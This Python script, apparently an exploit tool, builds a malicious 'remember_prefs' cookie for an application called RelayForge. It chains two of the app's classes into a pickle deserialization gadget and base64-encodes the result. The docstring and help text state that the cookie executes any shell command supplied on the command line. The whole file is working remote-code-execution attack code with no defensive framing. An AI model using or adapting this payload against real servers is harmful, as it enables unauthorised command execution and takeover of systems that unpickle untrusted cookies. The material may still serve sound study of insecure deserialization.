#!/usr/bin/env python3
"""Build RelayForge's authenticated remember-cookie pickle gadget chain."""

from __future__ import annotations

import argparse
import base64
import pickle
import re
import secrets
import sys

from prefs import JobRunner, JobTemplate


RESULT_NAME_RE = re.compile(r"[0-9a-f]{32}\.txt\Z")


def random_result_name() -> str:
    return f"{secrets.token_hex(16)}.txt"


def validate_result_name(name: str) -> None:
    if RESULT_NAME_RE.fullmatch(name) is None:
        raise ValueError("output must be 32 lowercase hexadecimal characters followed by .txt")


def payload(command: str) -> str:
    """Return the base64 cookie value for JobTemplate -> JobRunner RCE."""
    if not isinstance(command, str) or not command or "\x00" in command:
        raise ValueError("command must be a non-empty string without NUL bytes")
    template = JobTemplate.__new__(JobTemplate)
    template.command = command
    runner = JobRunner.__new__(JobRunner)
    runner.armed = True
    serialized = pickle.dumps((template, runner), protocol=4)
    if len(serialized) > 6144:
        raise ValueError("serialized payload exceeds the Web cookie limit")
    return base64.b64encode(serialized).decode("ascii")


def main() -> int:
    parser = argparse.ArgumentParser(description="Generate a RelayForge remember_prefs cookie")
    parser.add_argument("command", nargs="+", help="shell command executed by the trusted gadget pair")
    args = parser.parse_args()
    try:
        cookie = payload(" ".join(args.command))
    except ValueError as exc:
        parser.error(str(exc))
    print(cookie)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

